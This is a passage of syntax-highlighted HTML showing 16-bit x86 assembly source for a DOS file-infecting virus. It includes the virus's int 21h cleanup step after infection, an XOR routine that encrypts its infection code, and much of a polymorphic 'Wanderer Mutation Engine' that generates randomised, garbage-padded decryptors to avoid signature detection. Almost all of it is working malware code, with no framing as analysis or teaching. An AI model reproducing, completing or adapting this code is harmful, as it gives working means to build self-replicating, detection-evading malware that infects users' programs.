</span><span class="sc5">seg_i21</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">no_i21_error</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4B00h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; If error then re-enter virus int 21h</span><span class="sc0">
                                        </span><span class="sc1">;  to remove the virus copy done for</span><span class="sc0">
                                        </span><span class="sc1">;  infection</span><span class="sc0">
</span><span class="sc5">no_i21_error</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">     


</span><span class="sc1">; Prepare to call mutation engine</span><span class="sc0">
</span><span class="sc5">setup_engine</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0FFFFh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_n_random</span><span class="sc0">    </span><span class="sc1">; Get random mask [0..0FFFEh]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">xor_mask</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encrypt_infection_routine</span><span class="sc0">       </span><span class="sc1">; Encrypt</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">         </span><span class="sc1">; Always starts at DS:100h (EXE &amp; COM)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">VIRUS_SIZE</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">buffer1</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">160h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">   
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">random1</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">random2</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mutation_engine</span><span class="sc0">         </span><span class="sc1">; Encrypt to calculate the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">size_in_file</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">      </span><span class="sc1">;   increase size in file</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">random2</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">random1</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">    
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mutation_engine</span><span class="sc0">         </span><span class="sc1">; Encrypt virus code</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encrypt_infection_routine</span><span class="sc0">       </span><span class="sc1">; Decrypt inf. routine</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">     

</span><span class="sc5">encrypt_infection_routine</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">; Encrypt/decrypt the infection routine</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">   
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">infect_file</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">return_dpl0</span><span class="sc4">)-</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">infect_file</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">xor_mask</span><span class="sc0">
</span><span class="sc5">l_enc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">l_enc</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">    
        </span><span class="sc6">ret</span><span class="sc0">     


</span><span class="sc5">filesize_l</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">filesize_h</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">size_in_file</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">xor_mask</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">file_exeIP</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">file_reloCS</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">reloc_items</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ofs_relocitems</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc1">; Wanderer Mutation Engine</span><span class="sc0">
</span><span class="sc1">; Parameters :</span><span class="sc0">
</span><span class="sc1">;  DS:SI -&gt; code to encrypt</span><span class="sc0">
</span><span class="sc1">;  ES:DI -&gt; buffer</span><span class="sc0">
</span><span class="sc1">;  CX    -&gt; size</span><span class="sc0">
</span><span class="sc1">;  BP    -&gt; delta offset (runtime offset)</span><span class="sc0">
</span><span class="sc1">;  AX    -&gt; max size of decryptor</span><span class="sc0">
</span><span class="sc1">;  BX    -&gt; min size of decryptor</span><span class="sc0">
</span><span class="sc1">; Return :</span><span class="sc0">
</span><span class="sc1">;  CX    -&gt; size of decryptor + data encrypted</span><span class="sc0">

</span><span class="sc5">mutation_engine</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">enc_buffer</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">           </span><span class="sc1">; Addr. buffer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">delta_ofs</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">            </span><span class="sc1">; Addr. source code</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">mask_dec_ofs</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">end_encryptor</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc0">      </span><span class="sc1">; RET</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">code_size</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">            </span><span class="sc1">; Number of bytes to encrypt</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                   </span><span class="sc1">; Decryptor size in [BX..AX]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_n_random</span><span class="sc0">            </span><span class="sc1">; [0..AX-BX]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                   </span><span class="sc1">; [BX..AX]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">decryptor_size</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; Space for decryptor in buffer</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">; Copy code to encrypt</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_n_random</span><span class="sc0">            </span><span class="sc1">; [0,1]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ptr_select_reg</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_n_random</span><span class="sc0">            </span><span class="sc1">; [0..4]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">                  </span><span class="sc1">; [0Ah..0Eh]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">decryptor_size</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">operations</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">           </span><span class="sc1">; Number of encryption ops</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">max_garbage</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Max garbage per operation</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_n_random</span><span class="sc0">            </span><span class="sc1">; [0..2]</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">                      </span><span class="sc1">; AL in [1..3]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">op_dec_counter</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">    </span><span class="sc1">; Opcode for decreasing counter</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">reg_counter</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_garbage_number</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">enc_buffer</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">generate_garbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">register_table</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">ptr_select_reg</span><span class="sc0">       </span><span class="sc1">; Select registers in table</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; Register 0 (SI) or 1 (DI)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">indexreg_op1</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">         </span><span class="sc1">; Index for operations</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; Register 2 (SI) or 3 (DI)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">indexreg_op2</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">      </span><span class="sc1">; Index register</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc5">decryptor_size</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc5">delta_ofs</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_garbage_number</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">generate_mov</span><span class="sc0">            </span><span class="sc1">; Load a reg with delta-ofs</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">reg_counter</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc5">code_size</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_garbage_number</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; Decrypt words</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">generate_mov</span><span class="sc0">            </span><span class="sc1">; Load a reg with # of loops</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">in_loop</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ofs_loop_begin</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">       </span><span class="sc1">; Start of loop code</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_garbage_number</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">generate_garbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc5">operations</span><span class="sc0">           </span><span class="sc1">; Number of operations</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
</span><span class="sc5">l_gen_op</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">generate_operation</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_garbage_number</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">generate_garbage</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">l_gen_op</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; Gen. inc index reg (SI | DI)</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">indexreg_op2</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_garbage_number</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">generate_garbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                   </span><span class="sc1">; End loop</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">ofs_loop_begin</span><span class="sc0">       </span><span class="sc1">; Calculate loop size</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">code_loop</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; Generate end-loop code</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">               </span><span class="sc1">; Jmp to begin of loop</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">fill_with_garbage</span><span class="sc0">

</span><span class="sc5">code_loop</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">op_dec_counter</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">48h</span><span class="sc0">             </span><span class="sc1">; dec reg_counter: DEC CX | DX | BX</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">end_code_loop</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0e9h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; jmp to start of decryption loop</span><span class="sc0">
</span><span class="sc5">end_code_loop</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;;;;   Unused code ! ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E2h</span><span class="sc0">         </span><span class="sc1">; LOOP opcode</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">; Store it</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">; loop jmp</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc5">fill_with_garbage</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">decryptor_size</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">enc_buffer</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                   </span><span class="sc1">; Fill buffer with garbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">in_loop</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; Loop finished</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">generate_garbage</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">code_size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">decryptor_size</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">enc_buffer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">indexreg_op2</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">mov_pointerreg_bx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">inc_pointerreg</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">encryptor_ptr</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">89h</span><span class="sc0">                     </span><span class="sc1">; mov index register,bx</span><span class="sc0">
</span><span class="sc5">mov_pointerreg_bx</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">0D8h</span><span class="sc0">
</span><span class="sc5">l_encrypt_code</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">     
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">encryptor_ptr</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">
</span><span class="sc5">inc_pointerreg</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">40h</span><span class="sc0">                     </span><span class="sc1">; inc index register</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">l_encrypt_code</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">enc_buffer</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">code_size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">encryptor_ptr</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">end_encryptor</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; Reset buffers</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">ofs_endencryptor</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">end_encryptor</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F8h</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">mov_pointerreg_bx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">    </span><span class="sc1">; Clear registers</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">inc_pointerreg</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">op_dec_counter</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">     

</span><span class="sc5">register_table</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">4</span><span class="sc0">       </span><span class="sc1">; SI</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">5</span><span class="sc0">       </span><span class="sc1">; DI</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">6</span><span class="sc0">       </span><span class="sc1">; SI</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">7</span><span class="sc0">       </span><span class="sc1">; DI</span><span class="sc0">

</span><span class="sc5">generate_operation</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_n_random</span><span class="sc0">    </span><span class="sc1">; [0..6]</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">; AX in [0,4,8,...,24]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">operation_table</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; Select operation</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">encryptor_ptr</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc0">           </span><span class="sc1">; Needs an immediate address?</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">get_immaddr</span><span class="sc0">     </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Get decryptor opcode</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc5">indexreg_op1</span><span class="sc0"> </span><span class="sc1">; Insert op register</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">         </span><span class="sc1">; Add to decryptor</span><span class="sc0">
